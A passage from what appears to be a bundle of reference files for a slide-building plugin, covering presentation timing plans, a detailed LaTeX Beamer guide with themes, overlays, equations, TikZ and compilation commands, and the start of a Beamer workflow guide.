time\n\n**Don't**:\n- Repeat content\n- Add filler\n- Slow down artificially\n- Include low-quality material\n\n## Question and Answer Timing\n\n### Including Q&A in Your Time\n\n**If Q&A is within your slot**:\n- Plan for 20-30% of time for questions\n- 15-minute talk: Reserve 3-4 minutes\n- 45-minute talk: Reserve 10-15 minutes\n- Finish content 2-3 minutes early\n\n**Q&A Time Management**:\n- Brief answers (30-90 seconds each)\n- \"Great question, let me keep this brief...\"\n- Redirect detailed questions: \"Let's discuss after\"\n- Moderator or self-police time\n\n### Separate Q&A Time\n\n**If Q&A is after your slot**:\n- Use full allotted time\n- Finish exactly at time limit\n- Don't assume extra time\n- Have backup slides ready\n\n## Time Budgeting Template\n\n### Create Your Own Timing Plan\n\n```\nTalk Title: _______________________\nTotal Duration: ____ minutes\nTarget Slides: ____ slides\n\nIntroduction:\n- Slide 1: Title (__:__ - __:__)\n- Slide 2: Hook (__:__ - __:__)\n- Slide 3: Background (__:__ - __:__)\n[Continue for all slides...]\n\nCHECKPOINT: By __:__, should be at Slide ___\n\nMethods:\n- Slide __: [description] (__:__ - __:__)\n[...]\n\nCHECKPOINT: By __:__, should be at Slide ___\n\nResults:\n[...]\n\n[Continue for all sections]\n\nTotal Planned Time: ____\nBuffer: ____ minutes\n```\n\n### Example Timing Sheet\n\n```\n15-Minute Conference Talk\nTarget: 15:00, Slides: 1-18\n\n00:00 - 00:30 | Slide 1  | Title\n00:30 - 02:00 | Slide 2  | Background\n02:00 - 03:00 | Slide 3  | Research question\n------CHECKPOINT: 3 min, Slide 3------\n03:00 - 04:00 | Slide 4  | Study design\n04:00 - 05:00 | Slide 5  | Methods\n05:00 - 05:30 | Slide 6  | Analysis\n------CHECKPOINT: 5:30, Slide 6------\n05:30 - 08:00 | Slide 7-8 | Main result\n08:00 - 10:00 | Slide 9-10 | Result 2\n10:00 - 11:30 | Slide 11-12 | Result 3\n------CHECKPOINT: 11:30, Slide 12------\n11:30 - 12:30 | Slide 13-14 | Discussion\n12:30 - 13:30 | Slide 15-16 | Implications\n13:30 - 14:30 | Slide 17 | Conclusions\n14:30 - 15:00 | Slide 18 | Acknowledgments\n------END: 15:00------\n```\n\n## Common Timing Mistakes\n\n### Mistake 1: Over-Preparing Introduction\n\n**Problem**: Spending 5 minutes of 15-minute talk on background\n\n**Solution**:\n- Limit intro to 15-20% of total time\n- Jump to your contribution quickly\n- Save detailed review for discussion\n\n### Mistake 2: Equal Time Per Slide\n\n**Problem**: Spending same time on title slide as key result\n\n**Solution**:\n- Vary pace based on importance\n- Rush through simple slides\n- Linger on key findings\n\n### Mistake 3: No Time Checkpoints\n\n**Problem**: Realizing you're behind only at minute 12 of 15\n\n**Solution**:\n- Set 3-4 checkpoints\n- Glance at timer regularly\n- Adjust in real-time\n\n### Mistake 4: Skipping Practice\n\n**Problem**: First time through is during actual presentation\n\n**Solution**:\n- Practice minimum 3 times\n- Time each practice\n- Get feedback\n\n### Mistake 5: Not Preparing Plan B\n\n**Problem**: Run over time with no strategy\n\n**Solution**:\n- Know which slides to skip\n- Have condensed versions ready\n- Practice shortened version\n\n## Special Timing Considerations\n\n### Virtual Presentations\n\n**Adjustments**:\n- Slightly slower pace (5-10%)\n- More explicit transitions\n- Built-in pauses for lag\n- Buffer for technical issues\n\n**Time Allocation**:\n- Start 1-2 minutes early (tech check)\n- More time for Q&A (typing delays)\n- Share slides in advance if possible\n\n### Poster Spotlight Talks (3 Minutes)\n\n**Ultra-Tight Timing**:\n```\n0:00-0:30 | Title + Context\n0:30-1:30 | Problem + Approach\n1:30-2:30 | Key Result (one figure)\n2:30-3:00 | \"Visit poster #42\"\n```\n\n**Practice**: 10+ times to get exactly right\n\n### Invited Talks (45-60 Minutes)\n\n**More Flexibility**:\n- Can adjust pace based on audience\n- Welcome interruptions\n- Conversational style acceptable\n- Less rigid timing\n\n**Still Important**:\n- Have overall time structure\n- Monitor major checkpoints\n- Respect Q&A time\n\n## Summary: Key Timing Principles\n\n1. **Plan for 1 slide per minute** (adjust for complexity)\n2. **Spend 40-50% on results**\n3. **Practice 3-5 times minimum**\n4. **Set 3-4 time checkpoints**\n5. **Have Plan B for running over**\n6. **Never skip conclusions**\n7. **Finish on time** (non-negotiable)\n\n## Quick Reference Card\n\n```\nPRESENTATION TIMING CHEAT SHEET\n\nGeneral Rule: 1 slide = 1 minute\n\nSection Time Allocation (15-min talk):\n Intro: 2-3 min (20%)\n Methods: 2-3 min (15-20%)\n Results: 6-7 min (45%)\n Discussion: 2-3 min (15%)\n Conclusion: 1 min (5%)\n\nPractice Schedule:\n Run 1: Rough (expect to run long)\n Run 2: Smooth (fix transitions)\n Run 3: Timed (hit targets)\n Run 4+: Polish (perfect delivery)\n\nCheckpoints (15-min talk):\n 3-4 min: End of intro\n 7-8 min: Halfway through results\n 12-13 min: Starting conclusions\n\nEmergency Strategies:\n Running over? Skip backup slides\n Running under? Expand examples\n Lost? Return to time checkpoints\n Technical issue? Verbal summary\n\nRemember: Better to finish early than run over!\n```\n\n",
        "plugins/sys-research/skills/architecting-slides/references/beamer_guide.md": "# LaTeX Beamer Guide for Scientific Presentations\n\n## Overview\n\nBeamer is a LaTeX document class for creating presentations with professional, consistent formatting. It's particularly well-suited for scientific presentations containing equations, code, algorithms, and citations. This guide covers Beamer basics, themes, customization, and advanced features for effective scientific talks.\n\n## Why Use Beamer?\n\n### Advantages\n\n**Professional Quality**:\n- Consistent, polished appearance\n- Beautiful typography (especially for math)\n- Publication-quality output\n- Professional themes and templates\n\n**Scientific Content**:\n- Native equation support (LaTeX math)\n- Code listings with syntax highlighting\n- Algorithm environments\n- Bibliography integration\n- Cross-referencing\n\n**Reproducibility**:\n- Plain text source (version control friendly)\n- Programmatic figure generation\n- Consistent styling across presentations\n- Easy to maintain and update\n\n**Efficiency**:\n- Reuse content across presentations\n- Template once, use forever\n- Automated elements (page numbers, navigation)\n- No manual formatting\n\n### Disadvantages\n\n**Learning Curve**:\n- Requires LaTeX knowledge\n- Compilation time\n- Debugging can be challenging\n- Less WYSIWYG than PowerPoint\n\n**Flexibility**:\n- Complex custom layouts require effort\n- Image editing requires external tools\n- Some design elements easier in PowerPoint\n- Animations more limited\n\n**Collaboration**:\n- Not ideal for non-LaTeX users\n- Version conflicts possible\n- Requires LaTeX installation\n\n## Basic Beamer Document Structure\n\n### Minimal Example\n\n```latex\n\\documentclass{beamer}\n\n% Theme\n\\usetheme{Madrid}\n\\usecolortheme{beaver}\n\n% Title information\n\\title{Your Presentation Title}\n\\subtitle{Optional Subtitle}\n\\author{Your Name}\n\\institute{Your Institution}\n\\date{\\today}\n\n\\begin{document}\n\n% Title slide\n\\begin{frame}\n  \\titlepage\n\\end{frame}\n\n% Content slide\n\\begin{frame}{Slide Title}\n  Content goes here\n\\end{frame}\n\n\\end{document}\n```\n\n### Essential Packages\n\n```latex\n\\documentclass{beamer}\n\n% Encoding and fonts\n\\usepackage[utf8]{inputenc}\n\\usepackage[T1]{fontenc}\n\n% Graphics\n\\usepackage{graphicx}\n\\graphicspath{{./figures/}}\n\n% Math\n\\usepackage{amsmath, amssymb, amsthm}\n\n% Tables\n\\usepackage{booktabs}\n\\usepackage{multirow}\n\n% Colors\n\\usepackage{xcolor}\n\n% Algorithms\n\\usepackage{algorithm}\n\\usepackage{algorithmic}\n\n% Code listings\n\\usepackage{listings}\n\n% Citations\n\\usepackage[style=authoryear,backend=biber]{biblatex}\n\\addbibresource{references.bib}\n```\n\n### Frame Basics\n\n```latex\n% Basic frame\n\\begin{frame}{Title}\n  Content\n\\end{frame}\n\n% Frame with subtitle\n\\begin{frame}{Title}{Subtitle}\n  Content\n\\end{frame}\n\n% Frame without title\n\\begin{frame}\n  Content\n\\end{frame}\n\n% Fragile frame (for verbatim/code)\n\\begin{frame}[fragile]{Code Example}\n  \\begin{verbatim}\n  def hello():\n      print(\"Hello\")\n  \\end{verbatim}\n\\end{frame}\n\n% Plain frame (no header/footer)\n\\begin{frame}[plain]\n  Full slide content\n\\end{frame}\n```\n\n## Themes and Appearance\n\n### Presentation Themes\n\nBeamer includes many built-in themes controlling overall layout:\n\n**Classic Themes**:\n```latex\n\\usetheme{Berlin}      % Sections in header\n\\usetheme{Copenhagen}  % Minimal, clean\n\\usetheme{Madrid}      % Professional, rounded\n\\usetheme{Boadilla}    % Simple footer\n\\usetheme{AnnArbor}    % Vertical navigation\n```\n\n**Modern Themes**:\n```latex\n\\usetheme{CambridgeUS}  % Blue theme\n\\usetheme{Singapore}    % Minimalist\n\\usetheme{Rochester}    % Very minimal\n\\usetheme{Antibes}      % Tree navigation\n```\n\n**Popular for Science**:\n```latex\n% Clean and minimal\n\\usetheme{default}\n\\usetheme{Copenhagen}\n\n% Professional with navigation\n\\usetheme{Madrid}\n\\usetheme{Berlin}\n\n% Traditional academic\n\\usetheme{Pittsburgh}\n\\usetheme{Boadilla}\n```\n\n### Color Themes\n\n```latex\n% Blue themes\n\\usecolortheme{default}      % Blue\n\\usecolortheme{dolphin}      % Cyan-blue\n\\usecolortheme{seagull}      % Grayscale\n\n% Warm themes\n\\usecolortheme{beaver}       % Red/brown\n\\usecolortheme{rose}         % Pink/red\n\n% Nature themes\n\\usecolortheme{orchid}       % Purple\n\\usecolortheme{crane}        % Orange/yellow\n\n% Professional\n\\usecolortheme{albatross}    % Gray/blue\n```\n\n### Font Themes\n\n```latex\n\\usefonttheme{default}              % Standard\n\\usefonttheme{serif}                % Serif fonts\n\\usefonttheme{structurebold}        % Bold structure\n\\usefonttheme{structureitalicserif} % Italic serif\n\\usefonttheme{professionalfonts}    % Professional fonts\n```\n\n### Custom Colors\n\n```latex\n% Define custom colors\n\\definecolor{myblue}{RGB}{0,115,178}\n\\definecolor{myred}{RGB}{214,40,40}\n\n% Apply to theme elements\n\\setbeamercolor{structure}{fg=myblue}\n\\setbeamercolor{title}{fg=myred}\n\\setbeamercolor{frametitle}{fg=myblue,bg=white}\n\\setbeamercolor{block title}{fg=white,bg=myblue}\n```\n\n### Minimal Custom Theme\n\n```latex\n% Remove navigation symbols\n\\setbeamertemplate{navigation symbols}{}\n\n% Page numbers\n\\setbeamertemplate{footline}[frame number]\n\n% Simple itemize\n\\setbeamertemplate{itemize items}[circle]\n\n% Clean blocks\n\\setbeamertemplate{blocks}[rounded][shadow=false]\n\n% Colors\n\\setbeamercolor{structure}{fg=blue!70!black}\n\\setbeamercolor{title}{fg=black}\n\\setbeamercolor{frametitle}{fg=blue!70!black}\n```\n\n## Content Elements\n\n### Lists\n\n**Itemize**:\n```latex\n\\begin{frame}{Bullet Points}\n  \\begin{itemize}\n    \\item First point\n    \\item Second point\n      \\begin{itemize}\n        \\item Nested point\n      \\end{itemize}\n    \\item Third point\n  \\end{itemize}\n\\end{frame}\n```\n\n**Enumerate**:\n```latex\n\\begin{frame}{Numbered List}\n  \\begin{enumerate}\n    \\item First item\n    \\item Second item\n    \\item Third item\n  \\end{enumerate}\n\\end{frame}\n```\n\n**Description**:\n```latex\n\\begin{frame}{Definitions}\n  \\begin{description}\n    \\item[Term 1] Definition of term 1\n    \\item[Term 2] Definition of term 2\n  \\end{description}\n\\end{frame}\n```\n\n### Columns\n\n```latex\n\\begin{frame}{Two Column Layout}\n  \\begin{columns}\n    \n    % Left column\n    \\begin{column}{0.5\\textwidth}\n      \\begin{itemize}\n        \\item Point 1\n        \\item Point 2\n      \\end{itemize}\n    \\end{column}\n    \n    % Right column\n    \\begin{column}{0.5\\textwidth}\n      \\includegraphics[width=\\textwidth]{figure.png}\n    \\end{column}\n    \n  \\end{columns}\n\\end{frame}\n```\n\n**Three Column Layout**:\n```latex\n\\begin{columns}[T] % Align at top\n  \\begin{column}{0.32\\textwidth}\n    Content A\n  \\end{column}\n  \\begin{column}{0.32\\textwidth}\n    Content B\n  \\end{column}\n  \\begin{column}{0.32\\textwidth}\n    Content C\n  \\end{column}\n\\end{columns}\n```\n\n### Figures\n\n```latex\n\\begin{frame}{Figure Example}\n  \\begin{figure}\n    \\centering\n    \\includegraphics[width=0.8\\textwidth]{figure.pdf}\n    \\caption{Figure caption text}\n  \\end{figure}\n\\end{frame}\n```\n\n**Side-by-Side Figures**:\n```latex\n\\begin{frame}{Comparison}\n  \\begin{columns}\n    \\begin{column}{0.5\\textwidth}\n      \\includegraphics[width=\\textwidth]{fig1.pdf}\n      \\caption{Condition A}\n    \\end{column}\n    \\begin{column}{0.5\\textwidth}\n      \\includegraphics[width=\\textwidth]{fig2.pdf}\n      \\caption{Condition B}\n    \\end{column}\n  \\end{columns}\n\\end{frame}\n```\n\n**Subfigures**:\n```latex\n\\usepackage{subcaption}\n\n\\begin{frame}{Multiple Panels}\n  \\begin{figure}\n    \\centering\n    \\begin{subfigure}{0.45\\textwidth}\n      \\includegraphics[width=\\textwidth]{fig1.pdf}\n      \\caption{Panel A}\n    \\end{subfigure}\n    \\hfill\n    \\begin{subfigure}{0.45\\textwidth}\n      \\includegraphics[width=\\textwidth]{fig2.pdf}\n      \\caption{Panel B}\n    \\end{subfigure}\n    \\caption{Overall figure caption}\n  \\end{figure}\n\\end{frame}\n```\n\n### Tables\n\n```latex\n\\begin{frame}{Table Example}\n  \\begin{table}\n    \\centering\n    \\begin{tabular}{lcc}\n      \\toprule\n      Method & Accuracy & Time \\\\\n      \\midrule\n      Method A & 0.85 & 10s \\\\\n      Method B & 0.92 & 25s \\\\\n      Method C & 0.88 & 15s \\\\\n      \\bottomrule\n    \\end{tabular}\n    \\caption{Performance comparison}\n  \\end{table}\n\\end{frame}\n```\n\n### Blocks\n\n**Standard Blocks**:\n```latex\n\\begin{frame}{Block Examples}\n  \n  % Standard block\n  \\begin{block}{Block Title}\n    Block content goes here\n  \\end{block}\n  \n  % Alert block (red)\n  \\begin{alertblock}{Important}\n    Warning or important information\n  \\end{alertblock}\n  \n  % Example block (green)\n  \\begin{exampleblock}{Example}\n    Example content\n  \\end{exampleblock}\n  \n\\end{frame}\n```\n\n**Theorem Environments**:\n```latex\n\\begin{frame}{Mathematical Results}\n  \n  \\begin{theorem}\n    Statement of theorem\n  \\end{theorem}\n  \n  \\begin{proof}\n    Proof goes here\n  \\end{proof}\n  \n  \\begin{definition}\n    Definition text\n  \\end{definition}\n  \n  \\begin{lemma}\n    Lemma statement\n  \\end{lemma}\n  \n\\end{frame}\n```\n\n## Overlays and Animations\n\n### Progressive Disclosure with \\pause\n\n```latex\n\\begin{frame}{Revealing Content}\n  First point appears immediately\n  \n  \\pause\n  \n  Second point appears on click\n  \n  \\pause\n  \n  Third point appears on another click\n\\end{frame}\n```\n\n### Overlay Specifications\n\n**Itemize with Overlays**:\n```latex\n\\begin{frame}{Sequential Bullets}\n  \\begin{itemize}\n    \\item<1-> Appears on slide 1 and stays\n    \\item<2-> Appears on slide 2 and stays\n    \\item<3-> Appears on slide 3 and stays\n  \\end{itemize}\n\\end{frame}\n```\n\n**Alternative Syntax**:\n```latex\n\\begin{frame}{Sequential Bullets}\n  \\begin{itemize}[<+->]  % Automatically sequential\n    \\item First point\n    \\item Second point\n    \\item Third point\n  \\end{itemize}\n\\end{frame}\n```\n\n### Highlighting with Overlays\n\n**Alert on Specific Slides**:\n```latex\n\\begin{frame}{Highlighting}\n  \\begin{itemize}\n    \\item Normal text\n    \\item<2-| alert@2> Text highlighted on slide 2\n    \\item Normal text\n  \\end{itemize}\n\\end{frame}\n```\n\n**Temporary Appearance**:\n```latex\n\\begin{frame}{Appearing and Disappearing}\n  Appears on all slides\n  \n  \\only<2>{Only visible on slide 2}\n  \n  \\uncover<3->{Appears on slide 3 and stays}\n  \n  \\visible<4->{Also appears on slide 4, but reserves space}\n\\end{frame}\n```\n\n### Building Complex Figures\n\n```latex\n\\begin{frame}{Building a Figure}\n  \\begin{tikzpicture}\n    % Base elements (always visible)\n    \\draw (0,0) rectangle (4,3);\n    \n    % Add on slide 2+\n    \\draw<2-> (1,1) circle (0.5);\n    \n    % Add on slide 3+\n    \\draw<3->[->, thick] (2,1.5) -- (3,2);\n    \n    % Highlight on slide 4\n    \\node<4>[red,thick] at (2,1.5) {Result};\n  \\end{tikzpicture}\n\\end{frame}\n```\n\n## Mathematical Content\n\n### Equations\n\n**Inline Math**:\n```latex\n\\begin{frame}{Inline Math}\n  The equation $E = mc^2$ is famous.\n  \n  We can also write $\\alpha + \\beta = \\gamma$.\n\\end{frame}\n```\n\n**Display Math**:\n```latex\n\\begin{frame}{Display Equations}\n  Single equation:\n  \\begin{equation}\n    f(x) = \\int_{-\\infty}^{\\infty} e^{-x^2} dx = \\sqrt{\\pi}\n  \\end{equation}\n  \n  Multiple equations:\n  \\begin{align}\n    E &= mc^2 \\\\\n    F &= ma \\\\\n    V &= IR\n  \\end{align}\n\\end{frame}\n```\n\n**Equation Arrays**:\n```latex\n\\begin{frame}{Equation System}\n  \\begin{equation}\n    \\begin{cases}\n      \\dot{x} = f(x,y) \\\\\n      \\dot{y} = g(x,y)\n    \\end{cases}\n  \\end{equation}\n\\end{frame}\n```\n\n### Matrices\n\n```latex\n\\begin{frame}{Matrix Example}\n  \\begin{equation}\n    A = \\begin{bmatrix}\n      a_{11} & a_{12} & a_{13} \\\\\n      a_{21} & a_{22} & a_{23} \\\\\n      a_{31} & a_{32} & a_{33}\n    \\end{bmatrix}\n  \\end{equation}\n\\end{frame}\n```\n\n## Code and Algorithms\n\n### Code Listings\n\n```latex\n\\begin{frame}[fragile]{Python Code}\n  \\begin{lstlisting}[language=Python]\ndef fibonacci(n):\n    if n <= 1:\n        return n\n    return fibonacci(n-1) + fibonacci(n-2)\n  \\end{lstlisting}\n\\end{frame}\n```\n\n**Custom Code Styling**:\n```latex\n\\lstset{\n  language=Python,\n  basicstyle=\\ttfamily\\small,\n  keywordstyle=\\color{blue},\n  commentstyle=\\color{green!60!black},\n  stringstyle=\\color{orange},\n  numbers=left,\n  numberstyle=\\tiny,\n  frame=single,\n  breaklines=true\n}\n\n\\begin{frame}[fragile]{Styled Code}\n  \\begin{lstlisting}\n  # This is a comment\n  def hello(name):\n      \"\"\"Greet someone\"\"\"\n      print(f\"Hello, {name}\")\n  \\end{lstlisting}\n\\end{frame}\n```\n\n### Algorithms\n\n```latex\n\\begin{frame}{Algorithm Example}\n  \\begin{algorithm}[H]\n    \\caption{Quicksort}\n    \\begin{algorithmic}[1]\n      \\REQUIRE Array $A$, indices $low$, $high$\n      \\ENSURE Sorted array\n      \\IF{$low < high$}\n        \\STATE $pivot \\gets partition(A, low, high)$\n        \\STATE $quicksort(A, low, pivot-1)$\n        \\STATE $quicksort(A, pivot+1, high)$\n      \\ENDIF\n    \\end{algorithmic}\n  \\end{algorithm}\n\\end{frame}\n```\n\n## Citations and Bibliography\n\n### Inline Citations\n\n```latex\n\\begin{frame}{Background}\n  Previous work \\cite{smith2020} showed that...\n  \n  Multiple studies \\cite{jones2019,brown2021} have found...\n  \n  According to \\textcite{davis2022}, the method works by...\n\\end{frame}\n```\n\n### Bibliography Slide\n\n```latex\n% At end of presentation\n\\begin{frame}[allowframebreaks]{References}\n  \\printbibliography\n\\end{frame}\n```\n\n### Custom Bibliography Style\n\n```latex\n% In preamble\n\\usepackage[style=authoryear,maxbibnames=2,maxcitenames=2]{biblatex}\n\\addbibresource{references.bib}\n\n% Smaller font for references\n\\renewcommand*{\\bibfont}{\\scriptsize}\n```\n\n## Advanced Features\n\n### Section Organization\n\n```latex\n\\section{Introduction}\n\\begin{frame}{Introduction}\n  Content\n\\end{frame}\n\n\\section{Methods}\n\\begin{frame}{Methods}\n  Content\n\\end{frame}\n\n% Automatic outline\n\\begin{frame}{Outline}\n  \\tableofcontents\n\\end{frame}\n\n% Outline at each section\n\\AtBeginSection{\n  \\begin{frame}{Outline}\n    \\tableofcontents[currentsection]\n  \\end{frame}\n}\n```\n\n### Backup Slides\n\n```latex\n% Main presentation ends\n\\begin{frame}{Thank You}\n  Questions?\n\\end{frame}\n\n% Backup slides (not counted in numbering)\n\\appendix\n\n\\begin{frame}{Extra Data}\n  Additional analysis for questions\n\\end{frame}\n\n\\begin{frame}{Detailed Methods}\n  More methodological details\n\\end{frame}\n```\n\n### Hyperlinks\n\n```latex\n% Define labels\n\\begin{frame}{Main Result}\n  \\label{mainresult}\n  This is the main finding.\n\\end{frame}\n\n% Link to labeled frame\n\\begin{frame}{Reference}\n  As shown in the \\hyperlink{mainresult}{main result}...\n\\end{frame}\n\n% External links\n\\begin{frame}{Resources}\n  Visit \\url{https://example.com} for more information.\n  \n  \\href{https://github.com/user/repo}{GitHub Repository}\n\\end{frame}\n```\n\n### QR Codes\n\n```latex\n\\usepackage{qrcode}\n\n\\begin{frame}{Scan for Paper}\n  \\begin{center}\n    \\qrcode[height=3cm]{https://doi.org/10.1234/paper}\n    \n    \\vspace{0.5cm}\n    Scan for full paper\n  \\end{center}\n\\end{frame}\n```\n\n### Multimedia\n\n```latex\n\\usepackage{multimedia}\n\n\\begin{frame}{Video}\n  \\movie[width=8cm,height=6cm]{Click to play}{video.mp4}\n\\end{frame}\n```\n\n**Note**: Multimedia support varies by PDF viewer.\n\n## TikZ Graphics\n\n### Basic Shapes\n\n```latex\n\\usepackage{tikz}\n\n\\begin{frame}{TikZ Example}\n  \\begin{tikzpicture}\n    % Rectangle\n    \\draw (0,0) rectangle (2,1);\n    \n    % Circle\n    \\draw (3,0.5) circle (0.5);\n    \n    % Line with arrow\n    \\draw[->, thick] (0,0) -- (3,2);\n    \n    % Node with text\n    \\node at (1.5,2) {Label};\n  \\end{tikzpicture}\n\\end{frame}\n```\n\n### Flowcharts\n\n```latex\n\\usetikzlibrary{shapes,arrows,positioning}\n\n\\begin{frame}{Workflow}\n  \\begin{tikzpicture}[node distance=2cm]\n    \\node[rectangle,draw] (start) {Start};\n    \\node[rectangle,draw,right=of start] (process) {Process};\n    \\node[rectangle,draw,right=of process] (end) {End};\n    \n    \\draw[->,thick] (start) -- (process);\n    \\draw[->,thick] (process) -- (end);\n  \\end{tikzpicture}\n\\end{frame}\n```\n\n### Plots\n\n```latex\n\\usepackage{pgfplots}\n\\pgfplotsset{compat=1.18}\n\n\\begin{frame}{Data Plot}\n  \\begin{tikzpicture}\n    \\begin{axis}[\n      xlabel={$x$},\n      ylabel={$y$},\n      width=8cm,\n      height=6cm\n    ]\n    \\addplot[blue,thick] coordinates {\n      (0,0) (1,1) (2,4) (3,9)\n    };\n    \\addplot[red,dashed] {x};\n    \\end{axis}\n  \\end{tikzpicture}\n\\end{frame}\n```\n\n## Compilation\n\n### Basic Compilation\n\n```bash\n# Standard compilation\npdflatex presentation.tex\n\n# With bibliography\npdflatex presentation.tex\nbiber presentation\npdflatex presentation.tex\npdflatex presentation.tex\n```\n\n### Modern Compilation (Recommended)\n\n```bash\n# Using latexmk (automated)\nlatexmk -pdf presentation.tex\n\n# With continuous preview\nlatexmk -pdf -pvc presentation.tex\n```\n\n### Compilation Options\n\n```bash\n# Faster compilation (draft mode)\npdflatex -draftmode presentation.tex\n\n# Specific engine\nlualatex presentation.tex    # Better Unicode support\nxelatex presentation.tex     # System fonts\n\n# Output directory\npdflatex -output-directory=build presentation.tex\n```\n\n## Handouts and Notes\n\n### Creating Handouts\n\n```latex\n% In preamble\n\\documentclass[handout]{beamer}\n\n% This removes overlays and creates one frame per slide\n```\n\n### Speaker Notes\n\n```latex\n\\usepackage{pgfpages}\n\\setbeameroption{show notes on second screen=right}\n\n\\begin{frame}{Slide Title}\n  Slide content visible to audience\n  \n  \\note{\n    These notes are visible only to speaker:\n    - Remember to emphasize X\n    - Mention collaboration with Y\n    - Expect question about Z\n  }\n\\end{frame}\n```\n\n### Handout with Notes\n\n```latex\n\\documentclass[handout]{beamer}\n\\usepackage{pgfpages}\n\\pgfpagesuselayout{2 on 1}[a4paper,border shrink=5mm]\n```\n\n## Best Practices\n\n### Do's\n\n- GOOD Use consistent theme throughout\n- GOOD Keep equations simple and large\n- GOOD Use progressive disclosure (\\pause, overlays)\n- GOOD Include frame numbers\n- GOOD Use vector graphics (PDF) for figures\n- GOOD Test compilation early and often\n- GOOD Use meaningful section names\n- GOOD Keep backup slides in appendix\n\n### Don'ts\n\n- BAD Don't use too many different fonts or colors\n- BAD Don't fill slides with dense text\n- BAD Don't use tiny font sizes\n- BAD Don't include complex animations (limited support)\n- BAD Don't forget fragile frames for code\n- BAD Don't mix themes inconsistently\n- BAD Don't ignore compilation warnings\n\n## Troubleshooting\n\n### Common Issues\n\n**Missing Fragile**:\n```\nError: Verbatim environment in frame\nSolution: Add [fragile] option to frame\n```\n\n**Package Conflicts**:\n```\nError: Option clash for package X\nSolution: Load package in preamble only once\n```\n\n**Image Not Found**:\n```\nError: File `figure.pdf' not found\nSolution: Check path, use \\graphicspath, ensure file exists\n```\n\n**Overlay Issues**:\n```\nProblem: Overlays not working as expected\nSolution: Check syntax <n-> vs <n-m>, test incremental builds\n```\n\n### Debugging Tips\n\n```latex\n% Show frame labels\n\\usepackage[notref,notcite]{showkeys}\n\n% Draft mode (faster, shows boxes)\n\\documentclass[draft]{beamer}\n\n% Verbose error messages\n\\errorcontextlines=999\n```\n\n## Templates and Examples\n\n### Minimal Working Example\n\nSee `assets/beamer_template_conference.tex` for a complete, customizable template for conference talks.\n\n### Resources\n\n- Beamer User Guide: `texdoc beamer`\n- Theme Gallery: https://deic.uab.cat/~iblanes/beamer_gallery/\n- TikZ Examples: https://texample.net/tikz/\n\n## Summary\n\nBeamer excels at:\n- Mathematical content\n- Consistent professional formatting\n- Reproducible presentations\n- Version control\n- Citations and cross-references\n\nChoose Beamer when:\n- Presentation contains significant math/equations\n- You value version control and plain text\n- Consistent styling is priority\n- You're comfortable with LaTeX\n\nConsider PowerPoint when:\n- Extensive custom graphics needed\n- Collaborating with non-LaTeX users\n- Complex animations required\n- Rapid prototyping needed\n",
        "plugins/sys-research/skills/architecting-slides/references/beamer_workflow.md": "# LaTeX Beamer Workflow Guide\n\nCreate professional presentations with mathematical content using LaTeX Beamer.\n\n## Why Beamer?\n\n**Advantages**:\n- Beautiful mathematics and equations\n- Consistent, professional appearance\n- Version control friendly (plain text)\n- Excellent for algorithms and code\n- Reproducible and programmatic\n\n**Best for**: Mathematical content, consistent formatting, version control, technical presentations\n\n## Templates Available\n\nPre-built templates for different talk types:\n\n- **`assets/beamer_template_conference.tex`**: 15-minute conference talk\n- **`assets/beamer_template_seminar.tex`**: 45-minute academic seminar\n- **`assets/beamer_template_defense.tex`**: Dissertation defense\n\n## Step-by-Step Process\n\n### Step 1: Choose Template\n\nSelect the appropriate template based on your presentation duration and type.\n\n### Step 2: Customize Theme and Colors\n\nBeamer comes with built-in themes. Common themes include:\n\n**Dark Themes**:\n- `Madrid` (dark blue, professional)\n- `Singapore` (dark gray, clean)\n- `CambridgeUS` (dark red, academic)\n\n**Light Themes**:\n- `Antibes` (white, colorful)\n- `Copenhagen` (white, blue accents)\n- `Berkeley` (white, green accents)\n\n**Customization Example**:\n```latex\n% In preamble\n usetheme{Madrid}\n \\usecolortheme{beaver}\n \\usefonttheme{structurebold}\n \\setbeamercolor{title}{fg=darkblue}\n \\setbeamercolor{author}{fg=gray}\n```\n\n### Step 3: Add Content\n\nLaTeX native support for:\n- **Equations**: Use `equation`, `align`, `gather` environments\n- **Code**: Use `lstlisting` or `verbatim` environments\n- **Algorithms**: Use `algorithm` and `algorithmic` packages\n- **Figures**: Use `includegraphics` with proper sizing\n- **Tables**: Use standard LaTeX table environments\n\n### Step 4: Compile to PDF\n\n```bash\n# Compile with pdflatex\npdflatex presentation.tex\npdflatex presentation.tex  # Run twice for proper references\n```\n\n### Step 5: Convert to Images (Optional)\n\nFor visual validation:\n```bash\n# Using the pdf_to_images script\npython scripts/pdf_to_images.py presentation.pdf review/slides --dpi 150\n```\n\n## Example Presentation Structure\n\n```latex\n\\documentclass{beamer}\n\n% Packages\n\\usepackage{graphicx}\n\\usepackage{amsmath, amssymb}\n\\usepackage{listings}\n\n% Theme\n\\usetheme{Madrid}\n\\usecolortheme{beaver}\n\n% Title Page\n\\title{Your Presentation Title}\n\\subtitle{Subtitle if needed}\n\\author{Your Name}\n\\institute{Your Institution}\n\\date{\\today}\n\n\\begin{document}\n\n\\begin{frame}\n  \\titlepage\n\\end{frame}\n\n\\begin{frame}{Overview}\n  \\tableofcontents\n\\end{frame}\n\n\\section{Introduction}\n\\begin{frame}{Background}\n  \\begin{itemize}\n    \\item Point 1\n    \\item Point 2\n  \\end{itemize}\n\\end{frame}\n\n\\section{Methods}\n\\begin{frame}{Algorithm}\n  \\begin{algorithmic}\n    \\State Initialize parameters\n    \\State Perform computation\n    \\State Return result\n  \\end{algorithmic}\n\\end{frame}\n\n\\section{Results}\n\\begin{frame}{Key Findings}\n  \\begin{figure}\n    \\includegraphics[width=0.8\\textwidth]{figure.png}\n    \\caption{Your Figure Caption}\n  \\end{figure}\n\\end{frame}\n\n\\section{Conclusion}\n\\begin{frame}{Summary}\n  \\begin{itemize}\n    \\item Main point 1\n    \\item Main point 2\n  \\end{itemize}\n\\end{frame}\n\n\\end{document}\n```\n\n## Mathematics in Beamer\n\nBeamer excels at mathematical presentations.\n\n### Equations\n```latex\n\\begin{frame}{Mathematical Model}\n\nThe key equation is:\n\\begin{equation}\n  f(x) = \\sum_{i=1}^{n} a_i x^i\n\\end{equation}\n\n\\end{frame}\n```\n\n### Multi-line Equations\n```latex\n\\begin{frame}{Derivation}\n\n\\begin{align}\n  \\frac{\\partial L}{\\partial \\theta} &= \\frac{\\partial}{\\partial \\theta} \\sum_{i=1}^{n} \\log p(x_i | \\theta) \\\\\n  &= \\sum_{i=1}^{n} \\frac{\\partial}{\\partial \\theta} \\log p(x_i | \\theta)\n\\end{align}\n\n\\end{frame}\n```\n\n### Theorems and 